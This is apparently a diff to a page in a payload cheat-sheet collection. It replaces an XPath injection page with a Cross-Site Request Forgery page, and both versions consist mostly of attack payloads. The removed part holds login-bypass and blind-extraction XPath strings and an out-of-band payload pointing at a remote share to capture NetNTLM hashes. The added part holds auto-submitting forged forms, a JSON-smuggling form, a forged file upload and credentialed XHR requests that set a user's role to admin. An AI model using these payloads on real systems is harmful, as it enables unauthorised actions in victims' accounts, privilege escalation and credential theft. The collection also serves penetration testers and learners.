@@ -1,79 +1,162 @@
-# XPATH Injection
+# Cross-Site Request Forgery
 
-> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
 
 ## Summary
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [Blind Exploitation](#blind-exploitation)
-    * [Out Of Band Exploitation](#out-of-band-exploitation)
+    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
+    * [HTML GET - No User Interaction](#html-get---no-user-interaction)
+    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
+    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
+    * [HTML POST - multipart/form-data With File Upload - Requiring User Interaction](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
+    * [JSON GET - Simple Request](#json-get---simple-request)
+    * [JSON POST - Simple Request](#json-post---simple-request)
+    * [JSON POST - Complex Request](#json-post---complex-request)
 * [Labs](#labs)
 * [References](#references)
 
 ## Tools
 
-* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
-* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
-* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
-* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
-* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
+* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.
 
 ## Methodology
 
-Similar to SQL injection, you want to terminate the query properly:
+![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)
 
-```ps1
-string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
+When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
+
+### HTML GET - Requiring User Interaction
+
+```html
+<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
 ```
 
-```sql
-' or '1'='1
-' or ''='
-x' or 1=1 or 'x'='y
-/
-//
-//*
-*/*
-@*
-count(/child::node())
-x' or name()='username' or 'x'='y
-' and count(/*)=1 and '1'='1
-' and count(/@*)=1 and '1'='1
-' and count(/comment())=1 and '1'='1
-')] | //user/*[contains(*,'
-') and contains(../password,'c
-') and starts-with(../password,'c
+### HTML GET - No User Interaction
+
+```html
+<img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
 
-### Blind Exploitation
+### HTML POST - Requiring User Interaction
 
-1. Size of a string
+```html
+<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="username" type="hidden" value="CSRFd" />
+ <input type="submit" value="Submit Request" />
+</form>
+```
 
-    ```sql
-    and string-length(account)=SIZE_INT
-    ```
+### HTML POST - AutoSubmit - No User Interaction
 
-2. Access a character with `substring`, and verify its value the `codepoints-to-string` function
+```html
+<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="username" type="hidden" value="CSRFd" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
+```
 
-    ```sql
-    substring(//user[userid=5]/username,2,1)=CHAR_HERE
-    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
-    ```
+### HTML POST - multipart/form-data With File Upload - Requiring User Interaction
 
-### Out Of Band Exploitation
+```html
+<script>
+function launch(){
+    const dT = new DataTransfer();
+    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
+    dT.items.add( file );
+    document.xss[0].files = dT.files;
 
-```powershell
-http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
+    document.xss.submit()
+}
+</script>
+
+<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
+<input id="file" type="file" name="file"/>
+<input type="submit" name="" value="" size="0" />
+</form>
+<button value="button" onclick="launch()">Submit Request</button>
+```
+
+### JSON GET - Simple Request
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+</script>
+```
+
+### JSON POST - Simple Request
+
+With XHR :
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+//application/json is not allowed in a simple request. text/plain is the default
+xhr.setRequestHeader("Content-Type", "text/plain");
+//You will probably want to also try one or both of these
+//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+xhr.send('{"role":admin}');
+</script>
+```
+
+With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :
+
+```html
+<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
+// this input will send : {"role":admin,"other":"="}
+ <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
+</form>
+<script>
+ document.getElementById("CSRF_POC").submit();
+</script>
+```
+
+### JSON POST - Complex Request
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":admin}');
+</script>
 ```
 
 ## Labs
 
-* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
-* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
-* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)
+* [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
+* [PortSwigger - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
+* [PortSwigger - CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
+* [PortSwigger - CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
+* [PortSwigger - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
+* [PortSwigger - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
+* [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
+* [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
 
 ## References
 
-* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://web.archive.org/web/20170325082934/http://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
-* [XPATH Injection - OWASP - January 21, 2015](https://web.archive.org/web/20240217030110/http://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
+* [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3, 2016](https://web.archive.org/web/20220926223539/https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
+* [Cross-Site Request Forgery (CSRF) - OWASP - April 19, 2024](https://web.archive.org/web/20120920091432/https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
+* [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://web.archive.org/web/20170919181010/https://whitton.io/articles/messenger-site-wide-csrf/)
+* [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - July 19, 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
+* [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - October 9, 2014](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
+* [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://web.archive.org/web/20250519092910/https://hackerone.com/reports/100820)
+* [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
+* [How I Hacked Your Beats Account? Apple Bug Bounty - Aaditya Purani (@aaditya_purani) - July 20, 2016](https://web.archive.org/web/20250504102847/https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
+* [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://web.archive.org/web/20180102010752/https://hackerone.com/reports/245346)
+* [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15, 2018](https://web.archive.org/web/20260208211335/https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
+* [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - January 9, 2019](https://web.archive.org/web/20250906213239/https://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
+* [Cross-Site Request Forgery Attack - PwnFunction - April 5, 2019](https://web.archive.org/web/20251127000352/https://www.youtube.com/watch?v=eWEgUcHPle0)
+* [Wiping Out CSRF - Joe Rozner - October 17, 2017](https://web.archive.org/web/20250727045637/https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
+* [Bypass Referer Check Logic for CSRF - hahwul - October 11, 2019](https://web.archive.org/web/20250719144921/https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
